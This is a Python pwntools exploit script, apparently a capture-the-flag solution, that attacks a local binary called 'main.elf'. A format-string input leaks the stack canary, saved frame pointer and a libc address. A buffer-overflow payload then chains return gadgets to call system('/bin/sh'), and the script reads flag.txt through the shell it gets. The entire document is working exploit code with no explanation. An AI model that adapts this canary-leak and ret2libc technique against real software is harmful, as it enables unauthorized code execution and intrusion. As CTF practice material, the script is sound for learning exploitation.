#!/usr/bin/env python
from __future__ import print_function

import pwn

pwn.context.terminal = "tmux splitw -h".split()
pwn.context.arch="amd64"

exe = pwn.context.binary = pwn.ELF('main.elf')
libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")
system_offset = libc.sym['system']
libc_start_main_offset = libc.sym['__libc_start_main']

r = pwn.process("./main.elf".split())
#r = pwn.gdb.debug("./main.elf", gdbscript="b* readIn+65\nc")

r.recvuntil(">")
r.sendline("%71$llx/%72$llx/%79$llx")
[canary, rbp, libc_start_main240]  = r.recvline().strip('\n').split('/')
pwn.log.info("canary: 0x%s" % canary)
pwn.log.info("__libc_start_main+240: 0x%s" % libc_start_main240)

libc_base = int(libc_start_main240, 16) - libc_start_main_offset - 240
pwn.log.info("libc base: 0x%x" % libc_base)

system_base = libc_base + system_offset
pwn.log.info("system: 0x%x" % system_base)

payload = ""
#payload += pwn.cyclic(0x410 - 0x08)
payload += "a" * (0x410 - 0x8)
payload += pwn.p64(int(canary, 16))
payload += pwn.p64(int(rbp, 16))
payload += pwn.p64(exe.symbols.hint + 8) # ret sled for xmm0 memory alignment
payload += pwn.p64(exe.symbols.hint + 4)
payload += pwn.p64(libc_base + libc.search("/bin/sh\0").next())
payload += pwn.p64(libc_base + system_offset)

r.sendline(payload)

r.recv(timeout=1)

r.sendline("cat flag.txt")

flag = r.recv(timeout=60)
print(flag)
r.close()

f = open("./solution.txt", "w")
f.write(flag)
f.close()

